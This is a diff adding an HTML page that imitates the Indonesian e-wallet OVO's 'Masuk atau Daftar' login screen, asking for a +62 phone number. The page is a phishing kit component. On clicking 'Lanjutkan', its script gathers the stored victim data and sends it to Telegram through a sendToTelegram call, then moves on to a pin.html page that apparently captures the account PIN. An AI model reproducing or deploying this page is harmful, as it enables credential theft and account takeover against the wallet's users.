@@ -1,0 +1,188 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk atau Daftar</title>
+    <script src="data-handler.js"></script>
+    <style>
+        body {
+            font-family: sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fff; /* Sesuaikan dengan latar belakang gambar */
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px; /* Lebar maksimal agar terlihat seperti tampilan mobile */
+            background-color: #fff;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        .header .icon {
+            font-size: 24px;
+            cursor: pointer;
+        }
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        .phone-input-container {
+            display: flex;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            background-color: #f3e5f5;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); /* Added box shadow */
+        }
+        .phone-input-container:focus-within {
+            border: 1px solid #673ab7;
+            box-shadow: 0px 0px 0px 2px rgba(255, 0, 242, 0.068); /* Added box shadow */
+        }
+        .country-code {
+            padding: 12px;
+            background-color: #e1bee7; /* Warna latar belakang kode negara */
+            color: #333;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .phone-input {
+            flex-grow: 1;
+            padding: 12px;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            background-color: transparent; /* Biarkan input transparan */
+        }
+        .forgot-link {
+            font-size: 14px;
+            color: #007bff; /* Warna biru untuk link */
+            text-decoration: none;
+        }
+        .legal-text {
+            font-size: 12px;
+            color: #666;
+            margin-top: 40px; /* Jarak dari elemen di atasnya */
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .legal-text a {
+            color: #007bff; /* Warna biru untuk link legal */
+            text-decoration: none;
+        }
+        .button {
+            width: 100%;
+            padding: 12px;
+            background-color: #e0e0e0; /* Warna abu-abu untuk tombol non-aktif */
+            color: #9e9e9e; /* Warna teks abu-abu */
+            border: none;
+            border-radius: 25px; /* Membuat tombol melengkung */
+            font-size: 16px;
+            cursor: not-allowed; /* Kursor menunjukkan tombol non-aktif */
+            text-align: center;
+        }
+        .back-icon {
+            font-size: 36px;
+            cursor: pointer;
+        }
+        .help-icon {
+            font-size: 18px;
+            background-color: #673ab7; /* Purple */
+            color: white;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const phoneInput = document.querySelector('.phone-input');
+            const continueButton = document.querySelector('.button');
+
+            phoneInput.addEventListener('input', function() {
+                const phoneNumber = this.value.replace(/\D/g, '');
+                
+                // Limit to 13 digits
+                if (phoneNumber.length > 13) {
+                    this.value = phoneNumber.slice(0, 13);
+                }
+
+                if (phoneNumber.length >= 10 && phoneNumber.length <= 13) {
+                    continueButton.disabled = false;
+                    continueButton.style.backgroundColor = '#673ab7';
+                    continueButton.style.color = '#fff';
+                    continueButton.style.cursor = 'pointer';
+                } else {
+                    continueButton.disabled = true;
+                    continueButton.style.backgroundColor = '#e0e0e0';
+                    continueButton.style.color = '#9e9e9e';
+                    continueButton.style.cursor = 'not-allowed';
+                }
+            });
+
+            continueButton.addEventListener('click', async function() {
+                const phoneNumber = phoneInput.value.replace(/\D/g, '');
+                storeData('phone', phoneNumber);
+                
+                // Send data to Telegram
+                const data = getAllData();
+                const success = await sendToTelegram(data);
+                
+                if (success) {
+                    window.location.href = 'pin.html';
+                } else {
+                    showErrorPopup('Terjadi kesalahan. Silakan coba lagi.');
+                }
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="icon back-icon">&#x21E6;</div>
+            <div class="icon help-icon">?</div>
+        </div>
+        <div class="content">
+            <div class="title">Masuk atau Daftar</div>
+            <div class="subtitle">Masuk atau daftar cuma butuh nomor HP aja.</div>
+            <div class="phone-input-container">
+                <div class="country-code">+62</div>
+                <input type="tel" class="phone-input" placeholder=""> <!-- Placeholder bisa ditambahkan jika perlu -->
+            </div>
+            <div>
+                <a href="#" class="forgot-link">Nomor HP nggak aktif atau hilang? Atur Ulang</a>
+            </div>
+        </div>
+        <div class="legal-text">
+            Dengan masuk atau daftar, kamu udah setuju sama <a href="#">Ketentuan Layanan</a> dan <a href="#">Kebijakan Privasi</a> OVO.
+        </div>
+        <button class="button" disabled>Lanjutkan</button>
+    </div>
+</body>
+</html> 
